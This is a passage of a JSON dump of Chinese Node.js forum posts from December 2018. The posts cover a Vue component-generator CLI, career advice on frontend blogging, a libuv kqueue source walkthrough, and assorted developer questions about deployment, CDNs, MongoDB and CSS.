他是有这个功能能的–所以可能，大概，也许大家看着会很熟悉，似曾相识，</p>\n<h1>根据命令行创建（目前命令就一个，后续可以加…加…加…）</h1>\n<ul>\n<li>-1组件文件夹</li>\n<li>-2组件文件</li>\n<li>-3按需引入组件</li>\n<li>-4修改router配置（美其名曰：解放双手）\nvue-cli 目前没有----- 大家有用得到的  github 走一下star ==不胜感激</li>\n</ul>\n<h1>作用：</h1>\n<ul>\n<li>1.用来规范团队的 – 组件，路由，路由路径，命名</li>\n<li>2.节省一些（微微一些）人力，不用去创建文件和文件夹一节修改router配置文件</li>\n<li>3.我也不知道还有啥用----</li>\n</ul>\n<p>链接放一下：<a href=\"https://www.npmjs.com/package/banlg\">https://www.npmjs.com/package/banlg</a></p>\n<h2>以下是文档--------------------------我是分割线-------------------------------------------------------</h2>\n<h1>banlg</h1>\n<pre class=\"prettyprint\"><code>banlg  com  ?parentcom ?-t\n根据命令\n 1.更新router配置文件\n 2.创建对应组件文件结构\n 3.可自定义vue和css 模板\n</code></pre><h2>Installation</h2>\n<pre class=\"prettyprint language-bash\"><code>$ npm install banlg -g\n$ yarn global add banlg\n</code></pre><h2>API</h2>\n<h1>banlg  com   ?parentcom   ?-t</h1>\n<ul>\n<li><code>com &lt;String&gt;</code>: 将要创建组件名称</li>\n<li><code>parentcom &lt;String&gt;</code>: 父组件名称(可选)</li>\n<li><code>-t</code>: 是否插入当前父组件文件夹(可选)</li>\n<li>命名规则：驼峰  =&gt;  生成的路由path 用’-'连接</li>\n<li>项目根目录，（src同级）下可自定义vue.bl、css.bl模板，模板内会传入{{componentName}}、大驼峰{{ComponentName}}, 用{{}} 接收</li>\n<li>tips: ? 代表可选参数</li>\n</ul>\n<h2>能做什么</h2>\n<ul>\n<li>-1根据命令行创建 组件目录并初始化文件内容</li>\n<li>-2按需引入组件</li>\n<li>-3修改router配置（美其名曰：解放双手</li>\n<li>-4自动区别path命名：routes[0].path=’/’   children[0].path=’’</li>\n</ul>\n<h2>利于什么</h2>\n<ul>\n<li>1.用来规范团队的 – 组件.路由.路由路径.命名(防止某些人起名字【胡里花哨】的)</li>\n<li>2.节省一些（微微一些）人力，不用去创建文件和文件夹一节修改router配置文件</li>\n<li>3.缩减一些（微微一些）项目周期</li>\n</ul>\n</div>","title":"终端命令工具  自动生成vue组件文件以及修改router.js","last_reply_at":"2018-12-15T02:59:34.464Z","good":false,"top":false,"reply_count":0,"visit_count":593,"create_at":"2018-12-15T02:59:34.464Z","author":{"loginname":"Banlangenn","avatar_url":"https://avatars2.githubusercontent.com/u/19684540?v=4&s=120"}},{"id":"5c0a2ada15a4d545e3f4c3cd","author_id":"5afd3b2a0a36e5312d6ed20a","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>这个年底相信对于很多程序猿来说都不算太好过，是的，资本的寒冬已经到来。无论是传言某厂停止社招还是某商城末尾淘汰，亦或者某知名论坛因为“现金流”问题大裁员。这个年底，已经听到了很多知名公司裁员的消息了。</p>\n</blockquote>\n<h3>关于裁员的思考。</h3>\n<p>首先，资本总是逐利的，当然这是句废话，公司又不是散财童子或者观世音菩萨，公司招人肯定是要赚钱的。再者是互联网行业经历了一个巨大的风口，站在风口上，母猪也能上天。are you ok?互联网行业经历了一段热钱岁月，也催生了一堆泡沫。</p>\n<p>裁员呢，从公司的角度来看，为了利益的最大化，这两类人是比较危险的。</p>\n<ol>\n<li>高 p 人员。他们是公司的技术骨干，拿着丰厚的薪水以及股份。对于有些公司而言，高 p 人员消耗了大量的资源。</li>\n<li>能力靠后的人。这里的能力不只是说技术能力，包括各方面的能力。对于公司而言，这类人的单位产出比太低，甚至可能是负产出。</li>\n</ol>\n<p>总结就是公司裁员会留下那些要钱少，能做事的人。（老板不包括里面啊）</p>\n<h3>朋友面试的困惑</h3>\n<p>在微信群里经常有人问我，没有项目经验要怎么办，没有出彩的简历该怎么弄？</p>\n<p>等你看完这篇文章，如果能给你一些帮助的话，那将是我的荣幸。</p>\n<h3>为什么要打造自己的“前端品牌”</h3>\n<p>从面试官的角度来看，面试官只能从你的简历中找出你的亮点，来初步判断你是否适合这个岗位。那么作为前端的面试官，候选者的哪些品质会吸引到面试官呢？</p>\n<ol>\n<li>开源项目经历。（一般指 github）</li>\n<li>对自己的项目比较了解</li>\n<li>有那么一两个很熟悉的技术，比如 canvas，node 都是加分项</li>\n<li>对常用的框架源码有一定的了解</li>\n<li>有自己的博客</li>\n<li>有一定的自驱力</li>\n<li>漂亮的程序媛</li>\n</ol>\n<p>有开源项目参与经历至少说明候选者是一个乐于分享，熟悉基本的 git 流程，如果是一些知名项目的话还能体现出候选者的能力水平。对自己项目了解在面试中也是非常重要的一环，因为面试官会根据你写的项目经历去详细问你看你对技术的掌控程度。加分项就不用说了，可以体现出候选者好学。框架源码是大厂必考的一个点之一，为什么呢？因为大厂一般都会使用自己开发的框架，现代框架特性是基本相似的，虚拟 dom，diff，状态管理，路由等，面试官希望候选者能够了解框架的底层原理，而不是 api 的搬运工。自驱力一般指的是候选者的态度，比如学习的毅力，推动团队迭代，分享等。这篇文章着重讲的是有自己的博客。</p>\n<h3>怎么样打造自己的 “前端品牌”</h3>\n<h4>积极参与开源项目</h4>\n<p>github 上有各种各样的开源项目，有些项目非常有趣。通过参与 github 上面的开源项目，你可以认识特别多有趣的人，同时也能给你的简历增加权重。比如你给 vue.js 提供过几个 pr 并且成为贡献者之一，或者给 antd 修复了几个 bug，或者参与了某某翻译计划。</p>\n<p>如果你热爱开源（或者为了面试），你甚至可以花式提 pr。为了开源社区更好的发展，给出下列花式混 pr 的方式</p>\n<ol>\n<li>开源项目之初会有很多的问题，比如文档不完善，翻译错误，代码 bug 等。正是混 pr 的好时候</li>\n<li>关注知名开源项目，往往 issues 里面会存在很多的问题，如果你可以帮忙修复一些问题并提交 pull request，是不是既帮助了别人也成就了自己了呢。</li>\n</ol>\n<p>上面的建议虽然不入流，但是也从侧面推动了开源社区的发展，你也可以混得知名项目的贡献者荣誉。且不问你是怎么获得的，至少你付出了，就比别人更进一步，这就是你的优势。</p>\n<h4>积累日常学习的东西，形成文档。</h4>\n<p>俗语道：好记性不如烂笔头。虽然是陈词滥调，对于程序猿（媛）而言也一般不用“笔”，但确实是一件有意义的事情。</p>\n<p>我的几任上司都鼓励我多进行分享，多写文档去沉淀自己的技术。正是由于他们分享的这种精神，让我深受感染，也将会一直影响我未来的道路。技术的分享确实是一件非常令人兴奋的事情，一方面来说，分享的时候，你可以听到不同的声音，一个人的力量是有限的，这将帮助你去拓宽你的视野。分享的时候，很多人也会对细节进行详细的询问，你在讲解回答的过程中可以进一步加深自己的理解。另一方面，分享能够提高一个人的专注度，你总是渴望去把最好的东西展示出来，无形之中，你就学到了很多的东西。</p>\n<p>有一个很现实的问题是，如果你在开发的过程中遇到了一个很困难的问题，你通过搜索，询问各种方式去解决了。但是你没有文档，很久之后，你又遇到了相同的问题，结果你忘了，是不是又要重复去做这些无聊的动作。作为一个管理者而言，假如你的一个下属遇到了一个问题解决了，后面这个人离职了，又来了另外一个人，又是同样的问题，不知所措。这个时候你是不是很崩溃？所以大厂一定会有自己的文档库，（一定会有）。</p>\n<p>面试官从简历里面能够了解到的，除了你的工作经历，最主要的还是看你的博客，开源项目。</p>\n<p>写博客是需要坚持的一件事情，毅力很重要。也许刚开始你的文章并不出色，随着时间的推移，技术能力的上升。会越来越精彩，从而打造出你自己的“博客品牌”。</p>\n<p>我从准备做“前端指南”公众号开始，已经连续 2 个半月早上 6 点准时更新了。只要你能坚持 21 天，后续的就会保持习惯。</p>\n<h4>给初入门写博客的同学们一些建议。</h4>\n<p>前端领域的知识点文章其实都差不多，大家来来回回看的都是差不多的。比如原型链，es6,源码解析，某某开源项目实践。虽然很俗，对于个人而言，如果自己能写一些，对于基础的掌控还是非常有帮助的。</p>\n<p>借<strong>木易杨</strong>的计划来看看有哪些文章是可以写的</p>\n<ul>\n<li>【进阶 1 期】 调用堆栈</li>\n<li>【进阶 2 期】 作用域闭包</li>\n<li>【进阶 3 期】 this 全面解析</li>\n<li>【进阶 4 期】 深浅拷贝原理</li>\n<li>【进阶 5 期】 原型 Prototype</li>\n<li>【进阶 6 期】 高阶函数</li>\n<li>【进阶 7 期】 事件机制</li>\n<li>【进阶 8 期】 Event Loop 原理</li>\n<li>【进阶 9 期】 Promise 原理</li>\n<li>【进阶 10 期】Async/Await 原理</li>\n<li>【进阶 11 期】防抖/节流原理</li>\n<li>【进阶 12 期】模块化详解</li>\n<li>【进阶 13 期】ES6 重难点</li>\n<li>【进阶 14 期】计算机网络概述</li>\n<li>【进阶 15 期】浏览器渲染原理</li>\n<li>【进阶 16 期】webpack 配置</li>\n<li>【进阶 17 期】webpack 原理</li>\n<li>【进阶 18 期】前端监控</li>\n<li>【进阶 19 期】跨域和安全</li>\n<li>【进阶 20 期】性能优化</li>\n<li>【进阶 21 期】VirtualDom 原理</li>\n<li>【进阶 22 期】Diff 算法</li>\n<li>【进阶 23 期】MVVM 双向绑定</li>\n<li>【进阶 24 期】Vuex 原理</li>\n<li>【进阶 25 期】Redux 原理</li>\n<li>【进阶 26 期】路由原理</li>\n<li>【进阶 27 期】VueRouter 源码解析</li>\n<li>【进阶 28 期】ReactRouter 源码解析</li>\n</ul>\n<p>这些基本上也是各个公司面试会考的一些内容，各位可以从这上面入手。也可以参考 <strong>冴羽</strong> 的博客进行写作。等到达到一定的水平后，可以去写一些前沿的文章，这对面试而言是很有用的。</p>\n<h3>写在最后</h3>\n<p>希望能够帮助到大家。</p>\n<p>帮助他人成长，让大家成长到和我一样的水平，这对于我而言也是一种帮助 --我老大</p>\n<p>最后，想求一个关注！</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2018/12/7/167873d243b9c0d3?w=589&amp;h=243&amp;f=png&amp;s=46696\" alt></p>\n</div>","title":"2019年为自己打造一个“前端品牌”","last_reply_at":"2018-12-15T00:42:19.343Z","good":false,"top":false,"reply_count":8,"visit_count":1185,"create_at":"2018-12-07T08:10:02.349Z","author":{"loginname":"nanhupatar","avatar_url":"https://avatars1.githubusercontent.com/u/27266016?v=4&s=120"}},{"id":"5c144c117ec239239ff5705c","author_id":"5c0cd4067ec239239ff54fae","tab":"share","content":"<div class=\"markdown-text\"><p>自学了几个月编程，想做一个自己的博客项目，作为找工作的项目经验用，但是苦苦不知道如何入手，就找来这个项目先练练手，学习学习项目逻辑。该项目是根据nswbmw的教程《一起学node》学做了一个多人博客系统（评论统计出了点问题，找时间改改），欢迎来踩😃:</p>\n<p>仓库地址🏠：<a href=\"https://github.com/zhaoyn7/practice-express-mongo-blog\">https://github.com/zhaoyn7/practice-express-mongo-blog</a>\n项目部署地址🚀：<a href=\"http://blog-practice.herokuapp.com/\">http://blog-practice.herokuapp.com/</a></p>\n<p><strong>技术栈：</strong></p>\n<ul>\n<li>服务器、路由：express</li>\n<li>数据库：MongoDB =&gt; Mongoose</li>\n<li>头像显示：Gravatar</li>\n<li>Markdown格式转换成HTML：marked</li>\n<li>部署服务器：Heroku</li>\n</ul>\n<p><strong>功能：</strong>\n\t1）支持阅读、评论计数。\n\t2）支持用markdown发布文章、评论。\n\t3）支持文章标记标签。\n\t4）支持按照标题搜索文章。</p>\n<p><strong>需优化：</strong>\n\t1）路由代码过于臃肿。\n\t2）评论计数不对。</p>\n<p><strong>首页：</strong>\n<img src=\"https://ws1.sinaimg.cn/large/006tNbRwly1fy767slbctj30og0vdn7o.jpg\" alt></p>\n<p><strong>文章页：</strong>\n<img src=\"https://ws3.sinaimg.cn/large/006tNbRwly1fy767s8bv3j30o90q0n26.jpg\" alt></p>\n<p><strong>用户页：</strong>\n<img src=\"https://ws1.sinaimg.cn/large/006tNbRwly1fy767s1h8tj30ny0gt0x0.jpg\" alt></p>\n<p><strong>登陆/注册：</strong>\n<img src=\"https://ws2.sinaimg.cn/large/006tNbRwly1fy767ruuy5j30lw0bmdg8.jpg\" alt></p>\n<p><img src=\"https://ws1.sinaimg.cn/large/006tNbRwly1fy767rp83sj30nn0bt0t8.jpg\" alt></p>\n</div>","title":"简单版多人博客系统MongoDB+express","last_reply_at":"2018-12-15T00:34:25.121Z","good":false,"top":false,"reply_count":0,"visit_count":715,"create_at":"2018-12-15T00:34:25.121Z","author":{"loginname":"zhaoyn7","avatar_url":"https://avatars3.githubusercontent.com/u/30831076?v=4&s=120"}},{"id":"5c13bf5af3d48d2397c11668","author_id":"538ebff9c3ee0b58208376c7","tab":"ask","content":"<div class=\"markdown-text\"><p>还要在网页上添加微博组件！好烦啊！难道就没有纯为服务器而设的应用？\n<img src=\"//static.cnodejs.org/Fj2_FhH3t6nItJbCIIxIdFu3NR1k\" alt=\"屏幕快照 2018-12-14 22.28.47.png\"></p>\n</div>","title":"服务端调用新浪微博API，也要把应用设为“网页应用”？","last_reply_at":"2018-12-14T14:34:02.573Z","good":false,"top":false,"reply_count":0,"visit_count":525,"create_at":"2018-12-14T14:34:02.573Z","author":{"loginname":"zhanzhenzhen","avatar_url":"https://avatars3.githubusercontent.com/u/731796?v=4&s=120"}},{"id":"5c13a05c7ec239239ff56fa6","author_id":"51ece401f4963ade0e95513a","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>由于uv__io_t和uv__io_poll的强相关性，所以在这里就一起介绍了。本篇文章会通过发起一个http request，通过断点调试，详细介绍uv__io_t句柄结构体和event-loop的poll阶段</p>\n</blockquote>\n<h2>uv__io_t声明</h2>\n<p>从<a href=\"https://github.com/nodejs/node/blob/master/deps/uv/include/uv/unix.h#L83\">unix.h</a>切入:</p>\n<pre class=\"prettyprint language-c\"><code>struct uv__io_s {\n  uv__io_cb cb;\n  void* pending_queue[2];\n  void* watcher_queue[2];\n  unsigned int pevents; &#x2F;* Pending event mask i.e. mask at next tick. *&#x2F;\n  unsigned int events;  &#x2F;* Current event mask. *&#x2F;\n  int fd;\n  UV_IO_PRIVATE_PLATFORM_FIELDS\n};\n</code></pre><ul>\n<li><code>watcher_queue</code>观察者队列</li>\n<li>pevents 下一个事件的位掩码（bitmask）</li>\n<li>events 当前事件位掩码（bitmask）</li>\n</ul>\n<p>由于本人在MacOS环境下测试，所以 <code>UV_IO_PRIVATE_PLATFORM_FIELDS</code>宏展开为：</p>\n<pre class=\"prettyprint language-c\"><code>#define UV_IO_PRIVATE_PLATFORM_FIELDS                                         \\\n  int rcount;                                                                 \\\n  int wcount;                                                                \\\n</code></pre><ul>\n<li>rcount (read count)用于保存在POLLIN事件中可读取的字节量</li>\n<li>wcount(write count)用于保存在POLLOUT事件中可写缓存区的字节量</li>\n</ul>\n<p>这两个结构体成员变量取值全部由<code>kevent-&gt;data</code>返回。</p>\n<h2>uv__io_poll详解</h2>\n<h3>变量声明</h3>\n<p>首先我们看一下<code>uv__io_poll</code>中变量的定义：\n<img src=\"https://user-images.githubusercontent.com/5475069/49992981-7534d300-ffc0-11e8-99f8-98b814b86b68.png\" alt=\"image\">\n前端发起了一个http request，而这个request的回调会在poll阶段被触发，上图便是刚进入到poll阶段时候的截图，我们介绍几个主要的变量：</p>\n<ul>\n<li>events[1024] 为kevent结构体数组（<strong>在下面的介绍中我们会称之为eventlist</strong>），每一项均为一个kevent结构体变量，如图所示：\n<img src=\"https://user-images.githubusercontent.com/5475069/49993338-600c7400-ffc1-11e8-8868-7f0b466fec47.png\" alt=\"image\"></li>\n<li><code>ev</code> 为kevent的指针，它会指向eventlist 中放置事件的kevent结构体变量</li>\n<li><code>nevents</code> 为改变的eventlist数量（截图的时候<code>nevents</code>为2，因为在断点调试的时候有一个未完成的favicon.ico请求，刷新页面之后的http request请求在老页面favicon.ico请求之后。）</li>\n<li><code>revents</code> 为要执行的事件的bit掩码，主要用来传递给cb</li>\n<li><code>q</code> 用于取出当前的<code>watcher_queue</code>（即保存当前w的地方）</li>\n<li><code>w</code> 为<code>uv__io_t</code>的指针，指向当前的io观察者</li>\n<li><code>filter</code>为 kqueue过滤器</li>\n</ul>\n<h3>io观察者</h3>\n<p>下面我们看一下主要的代码逻辑：</p>\n<pre class=\"prettyprint language-c\"><code>    q = QUEUE_HEAD(&amp;loop-&gt;watcher_queue);\n    QUEUE_REMOVE(q);\n    QUEUE_INIT(q);\n    w = QUEUE_DATA(q, uv__io_t, watcher_queue);\n</code></pre><p>这段代码是通过<code>QUEUE_DATA</code>宏，从<code>watcher_queue</code>中取出当前的io观察者<code>w</code>。拿到了当前的io观察者，后面的事情就好办了。</p>\n<h3>事件（kqueue）初始化</h3>\n<p>事件的初始化是通过<code>EV_SET</code>宏实现的：</p>\n<pre class=\"prettyprint language-c\"><code>    if ((w-&gt;events &amp; POLLIN) == 0 &amp;&amp; (w-&gt;pevents &amp; POLLIN) != 0) {\n      filter = EVFILT_READ;\n      fflags = 0;\n      op = EV_ADD\n      &#x2F;&#x2F; ...\n      EV_SET(events + nevents, w-&gt;fd, filter, op, fflags, 0, 0);\n      if (++nevents == ARRAY_SIZE(events)) {\n        &#x2F;&#x2F; ...\n      }\n    }\n</code></pre><p>首先，我们通过位运算来判断本次请求的事件，由于是http request，所以这里就进入到了<code>POLLIN</code>事件中，进入流程之后的第一件事情就是改写过滤器为<code>EVFILT_READ</code>，之后通过<code>EV_SET</code>宏来初始化kevent结构体。\n<code>EV_SET</code>宏形参介绍：</p>\n<pre class=\"prettyprint language-c\"><code>EV_SET(_kev, ident, filter, flags, fflags, data, udata);\n</code></pre><ul>\n<li><code>_kev</code> kevent 结构体</li>\n<li><code>ident</code> fd文件描述符</li>\n<li><code>filter</code> kqueue过滤器</li>\n<li><code>flags</code> kqueue事件操作</li>\n<li><code>fflags</code> 特定过滤器标志</li>\n<li><code>data</code> 特定过滤器的数据</li>\n<li><code>udata</code> 用户传递的自定义数据</li>\n</ul>\n<p>通过形参的介绍，估计大家对上面<code>EV_SET(events + nevents, w-&gt;fd, filter, op, fflags, 0, 0);</code>这段代码的理解就比较清晰了。<code>EV_SET</code>会定义kqueue结构体，并通过这些传参对结构体初始化。在这之后通过<code>++nevents</code>记录了改变的eventlist数量。</p>\n<h3>事件(kevent)注册</h3>\n<p>事件的注册是通过kevent实现的：</p>\n<pre class=\"prettyprint language-c\"><code>    nfds = kevent(loop-&gt;backend_fd,\n                  events,\n                  nevents,\n                  events,\n                  ARRAY_SIZE(events),\n                  timeout == -1 ? NULL : &amp;spec);\n</code></pre><p><code>kevent</code>的定义如下：</p>\n<pre class=\"prettyprint language-c\"><code>kevent(int kq, const struct kevent\t*changelist, int nchanges,\n\t struct kevent *eventlist, int nevents,\n\t const struct timespec *timeout);\n</code></pre><ul>\n<li><code>kq</code> kqueue 描述符</li>\n<li><code>changelist</code> 增加或删除事件之后的eventlist 的指针</li>\n<li><code>nchanges</code> 增加或删除的数量</li>\n<li><code>eventlist</code> 为指向eventlist的指针</li>\n<li><code>nevents</code> eventlist的大小</li>\n<li><code>timeout</code> 超时时间</li>\n</ul>\n<p>通过参数的介绍，大家可以清晰的理解上文中的kevent调用，而kevent的返回值为待处理的事件数，在这里由<code>ndfs</code>来记录。</p>\n<h3>事件监听</h3>\n<p>事件的监听则是通过<code>ndfs</code>取出eventlist中的kevent，然后通过对<code>filter</code>过滤器的判断，实现不同事件类型的监听：</p>\n<pre class=\"prettyprint language-c\"><code>for (i = 0; i &lt; nfds; i++) {\n      ev = events + i;\n      fd = ev-&gt;ident;\n      &#x2F;&#x2F; ...\n      if (ev-&gt;filter == EVFILT_READ) {\n        if (w-&gt;pevents &amp; POLLIN) {\n          revents |= POLLIN;\n          w-&gt;rcount = ev-&gt;data;\n        } else {\n          &#x2F;&#x2F; ...\n        }\n      }\n      &#x2F;&#x2F; ....\n      if (w == &amp;loop-&gt;signal_io_watcher)\n        have_signals = 1;\n      else\n        w-&gt;cb(loop, w, revents);\n}\n</code></pre><p>下面为单步的详解：</p>\n<ul>\n<li><code>events + i</code>拿到待处理kevent的指针</li>\n<li><code>ev-&gt;filter == EVFILT_READ</code>过滤器来对事件类型进行过滤（同级if语句还有别的类型判断，在这里不做过多阐述）</li>\n<li><code>w-&gt;pevents &amp; POLLIN</code>实现对<code>POLLIN</code>事件的判断</li>\n<li><strong><code>w-&gt;rcount = ev-&gt;data;</code>把数据保存到了<code>w</code>即io观察者中</strong></li>\n<li>最终通过<code>w-&gt;cb(loop, w, revents);</code>触发回调</li>\n</ul>\n<p>参考资料：</p>\n<ul>\n<li>kevent: <a href=\"https://www.freebsd.org/cgi/man.cgi?query=kevent&amp;apropos=0&amp;sektion=0&amp;manpath=FreeBSD+9.0-RELEASE&amp;arch=default&amp;format=html\">https://www.freebsd.org/cgi/man.cgi?query=kevent&amp;apropos=0&amp;sektion=0&amp;manpath=FreeBSD+9.0-RELEASE&amp;arch=default&amp;format=html</a></li>\n</ul>\n<p>原文地址：<a href=\"https://github.com/xtx1130/blog/issues/34%E3%80%82%E5%A6%82%E6%9E%9C%E6%96%87%E4%B8%AD%E4%BB%8B%E7%BB%8D%E6%88%96%E8%80%85%E9%80%BB%E8%BE%91%E6%9C%89%E9%97%AE%E9%A2%98%EF%BC%8C%E6%AC%A2%E8%BF%8E%E5%A4%A7%E4%BD%AC%E7%95%99%E8%A8%80%E6%96%A7%E6%AD%A3%E3%80%82\">https://github.com/xtx1130/blog/issues/34。如果文中介绍或者逻辑有问题，欢迎大佬留言斧正。</a></p>\n<p>by 小菜</p>\n</div>","title":"libuv源码粗读（5）：uv__io_t io观察者句柄结构体和uv__io_poll介绍","last_reply_at":"2018-12-14T12:21:48.634Z","good":false,"top":false,"reply_count":0,"visit_count":680,"create_at":"2018-12-14T12:21:48.634Z","author":{"loginname":"xtx1130","avatar_url":"https://avatars2.githubusercontent.com/u/5475069?v=4&s=120"}},{"id":"5c1224577ec239239ff56894","author_id":"5bf3cec8e6481c5709f5d871","tab":"ask","content":"<div class=\"markdown-text\"><p>域名刚备案。服务器一直闲置。\n趁现在有点闲，想开发一个个人博客，但是完全没有设计感，做出来的有点丑！\n大家有个性网站推荐给我参考下么！\n到时候大家网站互相留入口推荐啊！哈哈哈</p>\n</div>","title":"我想开发一个个人博客玩。大家有推荐的魔板么？","last_reply_at":"2018-12-14T10:50:23.961Z","good":false,"top":false,"reply_count":3,"visit_count":828,"create_at":"2018-12-13T09:20:23.164Z","author":{"loginname":"tzbcf","avatar_url":"https://avatars1.githubusercontent.com/u/25059314?v=4&s=120"}},{"id":"5c07dcc9d3b8ab334e8db355","author_id":"5a2a98d5d92f2f5b185acd16","tab":"ask","content":"<div class=\"markdown-text\"><p>如果使用yaml文件该怎么配置 或者 有没有其它的配置方式 官网上面介绍的是npm的方式 本人对这方面小白 求解答</p>\n</div>","title":"node-egg框架怎么自动化部署 持续集成","last_reply_at":"2018-12-14T07:59:52.305Z","good":false,"top":false,"reply_count":7,"visit_count":1362,"create_at":"2018-12-05T14:12:25.505Z","author":{"loginname":"teenth","avatar_url":"https://avatars0.githubusercontent.com/u/16316491?v=4&s=120"}},{"id":"5b7f7239632c7f422e5b80fc","author_id":"5b35f23057137f22415c50f3","tab":"ask","content":"<div class=\"markdown-text\"><p>更新nuxtjs代码，也启用了 pm2 start “project-name” --watch 目录监听，目录一发生变化，pm2就会自动重启，但是前端并没发生什么变化，后来发现，每次更新完代码，都要npm run build，然后使用pm2 start npm  --name “projectname”   – run start ，再使用 pm2 restart all，才能使项目跑起来，这期间网页使无法访问的，只能执行完以上步骤，才可以正常访问，这样做的话，那岂不失去了pm2的意义了吗？有什么方法更改代码后，网页端就自动发生相应的变化吗？</p>\n</div>","title":"使用pm2守护nuxtjs，每次代码更新都要npm run build,再使用pm2重启进程吗？","last_reply_at":"2018-12-14T06:17:29.839Z","good":false,"top":false,"reply_count":6,"visit_count":1275,"create_at":"2018-08-24T02:49:29.157Z","author":{"loginname":"duanxingyu","avatar_url":"https://avatars1.githubusercontent.com/u/26548526?v=4&s=120"}},{"id":"5c122855f3d48d2397c10e1a","author_id":"53b25565399ed9e07d1e8793","tab":"ask","content":"<div class=\"markdown-text\"><p>给nodeclub提了个pr，包含两个功能</p>\n<ol>\n<li>刷新token</li>\n<li>评论以盖楼形式展示</li>\n</ol>\n<p>时隔两天，站长大大终于回复了，看了回复，我一直想笑，有兴趣的可以去看一下pr下面的回复 <a href=\"https://github.com/cnodejs/nodeclub/pull/1061\">https://github.com/cnodejs/nodeclub/pull/1061</a></p>\n<p>在这征求一下大家的意见，大伙觉得两个功能哪个有必要加？效果图如下</p>\n<p>刷新token\n<img src=\"https://camo.githubusercontent.com/89fcb05a1f2ac4dce4103bb76c9a5d29c3995ff8/687474703a2f2f7777312e73696e61696d672e636e2f6c617267652f636535363339356167793166793278366f7866396b6732307430303931337a612e676966\" alt></p>\n<p>盖楼展示\n<img src=\"https://user-images.githubusercontent.com/6915570/49789645-77e8bb80-fd67-11e8-8a16-1c4a4c74cdd6.png\" alt></p>\n</div>","title":"大家觉得这两个功能有必要加吗？征求一下意见！！","last_reply_at":"2018-12-14T03:15:09.696Z","good":false,"top":false,"reply_count":7,"visit_count":834,"create_at":"2018-12-13T09:37:25.970Z","author":{"loginname":"tomoya92","avatar_url":"https://avatars2.githubusercontent.com/u/6915570?v=4&s=120"}},{"id":"5c072913d3b8ab334e8dacbe","author_id":"5b6b991258db3ccf66a4533e","tab":"ask","content":"<div class=\"markdown-text\"><p>之前用bootcdn，10月份挂了一段时间听说维护者已经撤了，才换jsdelivr。现在jsdelivr也不行了吗？\n求大佬们推荐还有什么稳定的公共cdn呢\n<img src=\"//static.cnodejs.org/Fpqz7ksAuiyUT-OTWxb4boD3FiKi\" alt=\"image.png\">\n<img src=\"//static.cnodejs.org/FtAuXML8W2tcP_IMAU0-hitLG1VA\" alt=\"image.png\"></p>\n</div>","title":"jsdelivr被墙了？求大佬们推荐稳定的公共cdn","last_reply_at":"2018-12-14T02:12:55.227Z","good":false,"top":false,"reply_count":4,"visit_count":1388,"create_at":"2018-12-05T01:25:39.244Z","author":{"loginname":"CaanDoll","avatar_url":"https://avatars1.githubusercontent.com/u/23540471?v=4&s=120"}},{"id":"5c10725df3d48d2397c10438","author_id":"5832b84567db500b79c10136","tab":"ask","content":"<div class=\"markdown-text\"><p>如题，例如场景是有2张表，车辆表和用户表，车辆表中有一个字段是用户表的id，当我查询出一个车辆表的数组时需要查找出车辆表对应的用户并且聚合到车辆表然后返回给前端。\n目前想到的方案有2个：\n1、facebook开源的dataloader\n2、手动的遍历出车辆表中的用户id，进行一次查询出结果，再对应的循环聚合到车辆表结果中。\n各位大佬还有其他办法吗</p>\n</div>","title":"Mongodb怎么解决N+1查询的问题","last_reply_at":"2018-12-14T01:50:50.436Z","good":false,"top":false,"reply_count":5,"visit_count":875,"create_at":"2018-12-12T02:28:45.421Z","author":{"loginname":"MidiGeek","avatar_url":"https://avatars3.githubusercontent.com/u/17018186?v=4&s=120"}},{"id":"5c127e58f3d48d2397c11083","author_id":"59227363d371b6372a8afc26","tab":"ask","content":"<div class=\"markdown-text\"><p>情况是这样的，如下一个组件</p>\n<pre class=\"prettyprint language-jsx\"><code>&lt;Input.Group className=&quot;margin8&quot;&gt;\n  &#x2F;&#x2F; ...\n&lt;&#x2F;Input.Group&gt;\n</code></pre><p>渲染出来是这样</p>\n<pre class=\"prettyprint language-html\"><code>&lt;span class=&quot;ant-input-group margin8&quot;&gt;\n  &#x2F;&#x2F; ...\n&lt;&#x2F;span&gt;\n</code></pre><p>其中ant-input-group的样式是antd的，margin8是我写的</p>\n<pre class=\"prettyprint language-css\"><code>.ant-input-group {\n  margin: 0;\n}\n\n.margin8 {\n  margin: 8px 0;\n}\n</code></pre><p>两个选择器同权重，我的css靠后所以最终结果是<code>margin: 8px 0</code><br>\n但是在代码分割后，<code>.ant-input-group</code>的样式变成懒加载了，所以加载后就放在了<code>.margin8</code>后面覆盖了它的样式，变成了<code>margin: 0;</code></p>\n<p>这个问题应该怎么解决？</p>\n<p>目前想到的方法</p>\n<ul>\n<li>修改<code>.margin8</code>选择器来提升它的权重 这个直接pass</li>\n<li>把<code>.margin8</code>的属性设为<code>!important</code>，虽然不太喜欢用这个东西，但是好像用在这里并没有什么不合适，毕竟我加了这个类一定是希望它的<code>margin</code>设为<code>8px 0</code>，所以它的优先级应当最高。但是想一想这样的话以后所有这样的样式都要靠加<code>!important</code>来处理这个问题</li>\n<li>把我的css单独分割出来放在最后 目前想到的最好的方法，正在研究怎么配置webpack</li>\n</ul>\n<p>还有没有更好的方案？</p>\n</div>","title":"代码分割的时候产生了一个样式问题，一时竟想不出来一个合适优雅的解决办法","last_reply_at":"2018-12-13T15:44:24.232Z","good":false,"top":false,"reply_count":0,"visit_count":611,"create_at":"2018-12-13T15:44:24.232Z","author":{"loginname":"dislido","avatar_url":"https://avatars2.githubusercontent.com/u/25094788?v=4&s=120"}},{"id":"5c10fd677ec239239ff56395","author_id":"566192ec28d9d1ba58c3a319","tab":"ask","content":"<div class=\"markdown-text\"><p>以前用jquery+boostrap+express的项目可以很好兼容pc和移动端，最近用vue做前后端分离的项目困惑不止使用什么UI框架可以满足pc和移动端的兼容？</p>\n</div>","title":"前后端分离的vue项目使用什么ui框架可以适配pc和移动端","last_reply_at":"2018-12-13T12:17:39.460Z","good":false,"top":false,"reply_count":6,"visit_count":1226,"create_at":"2018-12-12T12:21:59.798Z","author":{"loginname":"jiangliqin","avatar_url":"https://avatars1.githubusercontent.com/u/12250847?v=4&s=120"}},{"id":"5c1217d2f3d48d2397c10d6f","author_id":"52c005d28a716e0b1578f9cc","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FrYBjwkgO_favTtC3r8WMk4y6Brl\" alt=\"167a062756f331fa.jpg\"></p>\n<p>12 月 9 号，杭州 NodeParty 和 Rokid 联合主办的第八期技术分享会，在 